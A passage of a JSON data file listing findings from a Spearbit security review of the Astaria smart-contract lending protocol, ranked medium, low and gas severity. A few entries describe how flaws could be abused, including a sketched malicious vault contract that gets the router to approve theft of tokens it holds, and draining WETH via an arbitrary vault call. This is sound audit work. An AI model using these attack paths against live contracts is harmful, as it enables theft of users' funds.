    },
    {
        "title": "Expired liens taken from public vaults need to be liquidated otherwise processing an epoch halts/reverts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "s.epochData[s.currentEpoch].liensOpenForEpoch is decremented or is supposed to be decre- mented, when for a lien with an end that falls on this epoch:  The full payment has been made,  Or the lien is bought out by a lien that is from a different vault or ends at a higher epoch,  Or the lien is liquidated. If for some reason a lien expires and no one calls liquidate, then s.epochData[s.currentEpoch].liensOpenForEpoch > 0 will be true and processEpoch() would revert till someones calls liquidate. Note that a lien's end falling in the s.currentEpoch and timeToEpochEnd() == 0 imply that the lien is expired. 35",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "assets < s.depositCap invariant can be broken for public vaults with non-zero deposit caps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The following check in mint / deposit does not take into consideration the new shares / amount sup- plied to the endpoint, since the yIntercept in totalAssets() is only updated after calling super.mint(shares, receiver) or super.deposit(amount, receiver) with the afterDeposit hook. uint256 assets = totalAssets(); if (s.depositCap != 0 && assets >= s.depositCap) { revert InvalidState(InvalidStates.DEPOSIT_CAP_EXCEEDED); } Thus the new shares or amount provided can be a really big number compared to s.depositCap, but the call will still go through.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "redeemFutureEpoch transfers the shares from the msg.sender to the vault instead of from the owner",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "redeemFutureEpoch transfers the vault shares from the msg.sender to the vault instead of from the owner.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lien buyouts can push maxPotentialDebt over the limit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a lien is bought out, _buyoutLien calls _getMaxPotentialDebtForCollateral to confirm that this number is lower than the maxPotentialDebt specified in the lien. However, this function is called with the existing stack, which hasn't yet replaced the lien with the new, bought out lien. Valid refinances can make the rate lower or the time longer. In the case that a lien was bought out for a longer duration, maxPotentialDebt will increase and could go over the limit specified in the lien.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Liens cannot be bought out once we've reached the maximum number of active liens on one collateral",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The buyoutLien function is intended to transfer ownership of a lien from one user to another. In practice, it creates a new lien by calling _createLien and then calls _replaceStackAtPositionWithNewLien to update the stack. In the _createLien function, there is a check to ensure we don't take out more than maxLiens against one piece of collateral: if (params.stack.length >= s.maxLiens) { revert InvalidState(InvalidStates.MAX_LIENS); } The result is that, when we already have maxLiens and we try to buy one out, this function will revert.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "First vault deposit can cause excessive rounding",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Aside from storage layout/getters, the context above notes the other major departure from Solmate's ERC4626 implementation. The modification requires the initial mint to cost 10 full WETH. 37 + + + function mint( uint256 shares, address receiver ) public virtual returns (uint256 assets) { // assets is 10e18, or 10 WETH, whenever totalSupply() == 0 assets = previewMint(shares); // No need to check for rounding error, previewMint rounds up. // Need to transfer before minting or ERC777s could reenter. // minter transfers 10 WETH to the vault ERC20(asset()).safeTransferFrom(msg.sender, address(this), assets); // shares received are based on user input _mint(receiver, shares); emit Deposit(msg.sender, receiver, assets, shares); afterDeposit(assets, shares); } Astaria highlighted that the code diff from Solmate is in relation to this finding from the previous Sherlock audit. However, deposit is still unchanged and the initial deposit may be 1 wei worth of WETH, in return for 1 wad worth of vault shares. Further, the previously cited issue may still surface by calling mint in a way that sets the price per share high (e.g. 10 shares for 10 WETH produces a price per of 1:1e18). Albeit, at a higher cost to the minter to set the initial price that high.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "When the collateral is listed on SeaPort by the borrower using listForSaleOnSeaport, when settled the liquidation fee will be sent to address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When the collateral s.auctionData[collateralId].liquidator (s.auctionData in general) will not be set and so it will be address(0) and thus the liquidatorPayment will be sent to address(0).",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "potentialDebt is not compared against a new lien's maxPotentialDebt in _appendStack",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _appendStack, we have the following block: newStack = new Stack[](stack.length + 1); newStack[stack.length] = newSlot; uint256 potentialDebt = _getOwed(newSlot, newSlot.point.end); ... if ( stack.length > 0 && potentialDebt > newSlot.lien.details.maxPotentialDebt ) { revert InvalidState(InvalidStates.DEBT_LIMIT); } Note, we are only performing a comparison between newSlot.lien.details.maxPotentialDebt and poten- tialDebt when stack.length > 0. If _createLien is called with params.stack.length == 0, we would not perform this check and thus the input params is not fully checked for misconfiguration.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Previous withdraw proxy's withdrawReserveReceived is not updated when assets are drained from the current withdraw proxy to the previous",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When drain is called, we don't update the s.epochData[s.currentEpoch - 1]'s withdrawRe- serveReceived, this is in contrast to when withdraw reserves are transferred from the public vault to the withdraw proxy. This would unlink the previous withdraw proxy's withdrawReserveReceived storage parameter to the total amount of assets it has received from either the public vault or the current withdraw proxy. An actor can manipulate Bn(cid:0)1 (cid:0) Wn(cid:0)1's value by sending assets to the public vault and the current withdraw proxy before calling transferWithdrawReserve ( Bn(cid:0)1 is the previous withdraw proxy's asset balance, Wn(cid:0)1 is previous withdraw proxy's withdrawReserveReceived and n is public vault's epoch). Bn(cid:0)1 (cid:0) Wn(cid:0)1 should really represent the sum of all near-boundary auction payment's the previous withdraw proxy receives plus any assets that are transferred to it by an external actor. Related Issue 46.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Update solc version and use unchecked in Uniswap related libraries",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The highlighted libraries above are referenced from Uniswap codebase which is intended to work with Solidity compiler <0.8. These older versions have unchecked arithmetic by default and the code takes it into account. Astaria code is intended to work with Solidity compiler >=0.8 which doesn't have unchecked arithmetic by default. Hence, to port the code, it has to be turned on via unchecked keyword. For example, FullMathUniswap.mulDiv(type(uint).max, type(uint).max, type(uint).max) reverts for v0.8, and returns type(uint).max for older version.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "buyoutLien is prone to race conditions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken.buyoutLien and VaultImplementation.buyoutLien are both prone to race conditions where multiple vaults can try to front-run each others' buyoutLien call to end up registering their own lien. Also note, due to the storage values s.minInterestBPS and s.minDurationIncrease being used in the is- ValidRefinance, the winning buyoutLien call does not necessarily have to have the best rate or duration among the other candidates in the race.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ERC20-Cloned allows certain actions for address(0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In ERC20-Cloned, address(0) can be used as the:  spender (spender)  to parameter of transferFrom.  to parameter of transfer.  to parameter of _mint.  from parameter of _burn. As an example, one can transfer or transferFrom to address(0) which would turn the amount of tokens unus- able but those not update the total supply in contrast to if _burn was called.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "BEACON_PROXY_IMPLEMENTATION and WETH cannot be updated for AstariaRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There is no update mechanism for BEACON_PROXY_IMPLEMENTATION and WETH in AstariaRouter. It would make sense that one would want to keep WETH as not upgradable (unless we provide the wrong address to the constructor). But for BEACON_PROXY_IMPLEMENTATION there could be possibilities of potentially upgrading it.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incorrect key parameter type is used for s.epochData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In PublicVault, whenever the epoch key provided is to the mapping s.epochData its type is uint64, but the type of s.epochData is mapping(uint256 => EpochData)",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "buyoutLien, canLiquidate and makePayment have different notion of expired liens when considering edge cases",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When swapping a lien that is just expired (lien's end tend equals to the current timestamp tnow ), one can call buyoutLien to swap it out. But when tnow > tend , buyoutLien reverts due to the underflow in _- getRemainingInterest when calculating the buyout amount. This is in contrast to canLiquidate which allows a lien with tnow = tend to liquidate as well. makePayment also only considers tend < tnow as expired liens. So the expired/non-functional liens time ranges for different endpoints are: endpoint expired range buyoutLien canLiquidate makePayment (tend , 1) [tend , 1) (tend , 1)",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ensure all ratios are less than 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Although, numerators and denominators for different fees are set by admin, it's a good practice to add a check in the contract for absurd values. In this case, that would be when numerator is greater than denominator.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Factor out s.slope updates",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Slope updates occur in multiple locations but do not emit events.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "External call to arbitrary address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The Router has a convenience function to commit to multiple liens AstariaRouter.commitToLiens. This function causes the router to receive WETH and allows the caller to supply an arbitrary vault address lien- Request.strategy.vault which is called by the router. This allows the potential for the caller to re-enter in the middle of the loop, and also allows them to drain any WETH that happens to be in the Router. In our review, no immediate reason for the Router to have WETH outside of commitToLiens calls was identified and therefore the severity of this finding is low.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Astaria's Seaport orders may not be listed on OpenSea",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "To list Seaport orders on OpenSea, the order should pass certain validations as described here(see OpenSea Order Validation). Currently, Astaria orders will fail this validation. For instance, zone and zoneHash values are not set as suggested.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Any ERC20 held in the Router can be stolen using ERC4626RouterBase functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "All four functions in ERC4626RouterBase.sol take in a vault address, a to address, a shares amount, and a maxAmountIn for validation. The first step is to read vault.asset() and then approve the vault to spend the ERC20 at whatever address is returned for the given amount. function mint( IERC4626 vault, address to, uint256 shares, uint256 maxAmountIn ) public payable virtual override returns (uint256 amountIn) { ERC20(vault.asset()).safeApprove(address(vault), shares); if ((amountIn = vault.mint(shares, to)) > maxAmountIn) { revert MaxAmountError(); } } In the event that the Router holds any ERC20, a malicious user can design a contract with the following functions: function asset() view pure returns (address) { return [ERC20 the router holds]; } function mint(uint shares, address to) view pure returns (uint) { return 0; } If this contract is passed as the vault, the function will pass, and the router will approve this contract to control its holdings of the given ERC20.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistency in byte size of maxInterestRate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In RouterStorage, maxInterestRate has a size of uint88. However, when being set from file(), it is capped at uint48 by the safeCastTo48() function.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Router#file has update for nonexistent MinInterestRate variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "One of the options in the file() function is to update FileType.MinInterestRate. There are two problems here: 1) If someone chooses this FileType, the update actually happens to s.maxInterestRate. 2) There is no minInterestRate storage variable, as minInterestBPS is handled on L235-236.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "getLiquidationWithdrawRatio() and getYIntercept() have incorrect return types",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "liquidationWithdrawRatio and yIntercept like other amount-related parameters are of type uint88 (uint88) and they are the returned values of getLiquidationWithdrawRatio() and getYIntercept() re- spectively. But the return type of getLiquidationWithdrawRatio() and getYIntercept() are defined as uint256.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The modified implementation of redeem is omitting a check to make sure not to redeem 0 assets.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The modified implementation of redeem is omitting the check // Check for rounding error since we round down in previewRedeem. require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\"); You can see a trail of it in redeemFutureEpoch.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PublicVault's redeem and redeemFutureEpoch always returns 0 assets.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "assets returned by redeem and redeemFutureEpoch will always be 0, since it has not been set in redeemFutureEpoch. Also Withdraw event emits an incorrect value for asset because of this. The issue stems from trying to consolidate some of the logic for redeem and withdraw by using redeemFutureEpoch for both of them.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OWNER() cannot be updated for private or public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "owner() is an immutable data for any ClonesWithImmutableArgs.clone that uses AstariaVault- Base. That means for example if there is an issue with the current hardcoded owner() there is no way to update it and liquidities/assets in the public/private vaults would also be at risk.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ROUTER() can not be updated for private or public vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "ROUTER() is an immutable data for any ClonesWithImmutableArgs.clone that uses AstariaVault- Base. That means for example if there is an issue with the current hardcoded ROUTER() or that it needs to be upgraded, the current public/private vaults would not be able to communicate with the new ROUTER.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong return parameter type is used for getOwed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Both variations of getOwed use _getOwed and return uint192. But _getOwed returns a uint88.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Document and reason about which functionalities should be frozen on protocol pause",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "On protocol pause, a few functions are allowed to be called. Some instances are noted above. There is no documentation on why these functionalities are allowed while the remaining functions are frozen.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Wrong parameter type is used for s.strategyValidators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "s.strategyValidators is of type mapping(uint32 => address) but the provided TYPE in the con- text is of type uint8.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Some functions do not emit events, but they should",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "AstariaRouter.sol#L268 : Other filing endpoints in the same contract and also CollateralToken and LienToken emit FileUpdated(what, data). But fileGuardian does not.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "setNewGuardian can be changed to a 2 or 3 step transfer of authority process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The current guardian might pass a wrong _guardian parameter to setNewGuardian which can break the upgradability of the AstariaRouter using fileGuardian.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "There are no range/value checks when some parameters get fileed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are no range/value checks when some parameters get fileed. For example:  There are no hardcoded range checks for the ...Numerators and ...Denominators, so that the protocol's users can trustlessly assume the authorized users would not push these values into ranges seemed unac- ceptable.  When an address get updated, we don't check whether the value provided is address(0) or not.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Manually constructed storage slots can be chosen so that the pre-image of the hash is unknown",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the codebase, some storage slots are manually constructed using keccak256 hash of a string xyz.astaria. .... The pre-images of these hashes are known. This can allow in future for actors to find a potential path to those storage slots using the keccak256 hash function in the codebase and some crafted payload.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Avoid shadowing variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The highlighted line declares a new variable owner which has already been defined in Auth.sol inherited by LienToken: address owner = ownerOf(lienId);",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "PublicVault.accrue is manually inlined rather than called",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The _accrue function locks in the implied value of the PublicVault by calculating, then adding to yIntercept, and finally emitting an event. This calculation is duplicated in 3 separate locations in PublicVault:  In totalAssets  In _accrue  And in updateVaultAfterLiquidation",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CollateralToken.flashAction reverts with incorrect error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Reverts with InvalidCollateralStates.AUCTION_ACTIVE when the address is not flashEnabled.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "AstariaRouter has unnecessary access to setPayee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "LienToken.setPayee. setPayee is never called from AstariaRouter, but the router has access to call",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ClearingHouse can be deployed only when needed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When collateral is deposited, a Clearing House is automatically deployed. However, these Clearing Houses are only needed if the collateral goes to auction at Seaport, either through liquidation or the collateral holder choosing to sell them. The Astaria team has indicated that this behavior is intentional in order to put the cost on the borrower, since liquidations are already expensive. I'd suggest the perspective that all pieces of collateral will be added to the system, but a much smaller percentage will ever be sent to Seaport. The aggregate gas spent will be much, much lower if we are careful to only deploy these contract as needed. Further, let's look at the two situations where we may need a Clearing House: 1) The collateral holder calls listForSaleOnSeaport(): In this case, the borrower is paying anyways, so it's a no brainer. 2) Another user calls liquidate(): In this case, they will earn the liquidation fees, which should be sufficient to justify a small increase in gas costs.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "PublicVault.claim() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "For claim not to revert we would need to have msg.sender == owner(). And so when the following is called: _mint(owner(), unclaimed); Instead of owner() we can use msg.sender since reading the immutable owner() requires some calldata lookup.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can remove incoming terms from LienActionBuyout struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Incoming terms are never used in the LienActionBuyout struct. The general flow right now is:  incomingTerms are passed to VaultImplementation#buyoutLien.  These incoming terms are validated and used to generate the lien information.  The lien information is encoded into a LienActionBuyout struct.  This is passed to LienToken#buyoutLien, but then the incoming terms are never used again.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Refactor updateVaultAfterLiquidation to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In updateVaultAfterLiquidation, we check if we're within maxAuctionWindow of the end of the If we are, we call _deployWithdrawProxyIfNotDeployed and assign withdrawProxyIfNearBoundary to epoch. the result. We then proceed to check if withdrawProxyIfNearBoundary is assigned and, if it is, call handleNewLiquidation. Instead of checking separately, we can include this call within the block of code executed if we're within maxAuc- tionWindow of the end of the epoch. This is true because (a) withdraw proxy will always be deployed by the end of that block and (b) withdraw proxy will never be deployed if timeToEnd >= maxAuctionWindow.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use collateralId to set collateralIdToAuction mapping",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "_listUnderlyingOnSeaport() sets collateralIdToAuction mapping as follows: s.collateralIdToAuction[uint256(listingOrder.parameters.zoneHash)] = true; Since this function has access to collateralId, it can be used instead of using zoneHash.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Storage packing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "RouterStorage: The RouterStorage struct represents state managed in storage by the AstariaRouter contract. Some of the packing in this struct is sub optimal. 1. maxInterestRate and minInterestBPS: These two values pack into a single storage slot, however, are never referenced together outside of the constructor. This means, when read from storage, there are no gas efficiencies gained. 2. Comments denoting storage slots do not match implementation. The comment //slot 3 + for example occurs far after the 3rd slot begins as the addresses do not pack together. LienStorage: 3. The LienStorage struct packs maxLiens with the WETH address into a single storage slot. While gas is saved on the constructor, extra gas is spent in parsing maxLiens on each read as it is read alone. VaultData: 4. VaultData packs currentEpoch into the struct's first slot, however, it is more commonly read along with values from the struct's second slot.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ClearingHouse fallback can save WETH address to memory to save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The fallback function reads WETH() from ROUTER three times. once and save to memory for the future calls.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "CollateralToken's onlyOwner modifier doesn't need to access storage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "The onlyOwner modifier calls to ownerOf(), which loads storage itself to check ownership. We can save a storage load since we don't need to load the storage variables in the modifier itself.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can stop loop early in _payDebt when everything is spent",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "When a loan is sold on Seaport and _payDebt is called, it loops through the auction stack and calls _paymentAH for each, decrementing the remaining payment as money is spent. This loop can be ended when payment == 0.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can remove initializing allowList and depositCap for private vaults",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Private Vaults do not allow enabling, disabling, or editing the allow list, and don't enforce a deposit cap, so seems strange to initialize these variables. Delegates are still included in the _validateCommitment function, so we can't get rid of this entirely.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ISecurityHook.getState can be modified to return bytes32 / hash of the state instead of the state itself.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Since only the keccak256 of preTransferState is checked against the kec- cak256 hash of the returned security hook state, we could change the design so that ISecurityHook.getState returns bytes32 to save gas. Unless there is a plan to use the bytes memory preTransferState in some other form as well.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Define an endpoint for LienToken that only returns the liquidator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "It would save a lot of gas if LienToken had an endpoint that would only return the liquidator for a collateralId, instead of all the auction data.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Setting uninitialized stack variables to their default value can be avoided.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "Setting uninitialized stack variables to their default value adds extra gas overhead. T t = <DEFAULT_VALUE>;",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Simplify / optimize for loops",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In the codebase, sometimes there are for loops of the form: for (uint256 i = 0; <CONDITION>; i++) { <BODY> } These for loops can be optimized.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "calculateSlope can be more simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "calculateSlope can be more simplified: owedAtEnd would be: owedAtEnd = amt + (tend (cid:0) tlast )r amt 1018 where:  amt is stack.point.amount  tend is stack.point.end  tlast is stack.point.last  r is stack.lien.details.rate and so the returned value would need to be r amt 1018.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Break out of _makePayment for loop early when totalCapitalAvailable reaches 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "In _makePayment we have the following for loop: for (uint256 i; i < n; ) { (newStack, spent) = _payment( s, stack, uint8(i), totalCapitalAvailable, address(msg.sender) ); totalCapitalAvailable -= spent; unchecked { ++i; } } When totalCapitalAvailable reaches 0 we still call _payment which costs a lot of gas and it is only used for transferring 0 assets, removing and adding the same slope for a lien owner if it is a public vault and other noops.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_buyoutLien can be optimized by reusing payee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "payee in _buyoutLien can be reused to save some gas",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "isValidRefinance and related storage parameters can be moved to LienToken",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "isValidRefinance is only used in LienToken and with the current implementation it requires reading AstariaRouter from the storage and performing a cross-contract call which would add a lot of overhead gas cost.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "auctionWindowMax can be reused to optimize liquidate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
        "body": "There are mutiple instances of s.auctionWindow + s.auctionWindowBuffer in the liquidate func- tion which would make the function to read from the storage twice each time. Also there is already a stack variable auctionWindowMax defined as the sum which can be reused.",
        "labels": [
            "Spearbit",
            "Astaria",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "fileBatch() does requiresAuth for each file separately",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf",
